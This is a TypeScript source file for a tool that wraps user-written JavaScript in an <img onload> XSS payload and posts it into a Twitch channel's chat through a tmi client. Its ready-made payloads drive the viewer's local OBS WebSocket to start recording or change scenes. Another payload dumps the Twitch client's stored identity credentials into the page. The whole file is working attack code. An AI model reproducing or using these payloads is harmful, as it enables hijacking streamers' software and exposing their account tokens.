import './style.css';
import './inject.css';
import { client } from './tmi';

// this function is ugly and very specific,
// I fucking hate minifiers that do not support esm.
const makeTinyFunctionString = (fnStr: string) =>
  fnStr
    .replace(/\s/g, '')
    .replace('const', 'const ')
    .replace(/new/g, 'new ')
    .replace('()=>{', '')
    .replace(/[;}]$/, '')
    .replace(/;/g, '; ')
    .replaceAll('"', "'")

// selectors
const sendButton = document.querySelector<HTMLButtonElement>('#app .controls-sendchat')!;
const copyButton = document.querySelector<HTMLButtonElement>('#app .preview-copy')!;
const startOBSButton = document.querySelector<HTMLButtonElement>('#app .obscontrols-start')!;
const changeOBSButton = document.querySelector<HTMLButtonElement>('#app .obscontrols-change')!;
const getTwitchPasswordButton = document.querySelector<HTMLButtonElement>('#app .obscontrols-getpw')!;
const textArea = document.querySelector<HTMLTextAreaElement>('#app .controls-input')!;
const resultPre = document.querySelector<HTMLPreElement>('#app .preview-result')!;

const createPayloadString = (tinyFunction: string) =>
  `<img src="https://cataas.com/cat" onload="${tinyFunction}">`;

const startOBSFn = () => {
  const ws = new WebSocket('ws://localhost:4455');
  ws.addEventListener('open', () => {
    ws.send(JSON.stringify({ op: 1, d: { rpcVersion: 1 } }));
    ws.send(JSON.stringify({ op: 6, d: { requestId: 2, requestType: 'StartRecord' } }));
  });
};

const changeSceneFn = () => {
  const ws = new WebSocket('ws://localhost:4455');
  ws.addEventListener('open', () => {
    ws.send(JSON.stringify({ op: 1, d: { rpcVersion: 1 } }));
    ws.send(
      JSON.stringify({
        op: 6,
        d: { requestId: 2, requestType: 'SetCurrentProgramScene', requestData: { sceneName: 'WebcamBen' } },
      }),
    );
  });
};

sendButton.addEventListener('click', () => {
  const payload = createPayloadString(makeTinyFunctionString(textArea.value));
  client.say('neolectron', payload);
});

textArea.addEventListener('input', () => {
  const payload = createPayloadString(makeTinyFunctionString(textArea.value));
  resultPre.innerText = payload;
});

copyButton.addEventListener('click', () => {
  const payload = createPayloadString(makeTinyFunctionString(textArea.value));
  navigator.clipboard.writeText(payload);
});

startOBSButton.addEventListener('click', () => {
  textArea.textContent = startOBSFn.toString();
});

changeOBSButton.addEventListener('click', () => {
  textArea.textContent = changeSceneFn.toString();
});

// you might need to change the path of the module to load where the tmi client lives.
getTwitchPasswordButton.addEventListener('click', () => {
  textArea.textContent = `import('./src/tmi.ts').then((m) => document.body.innerHTML = JSON.stringify(m.client.opts.identity))`
})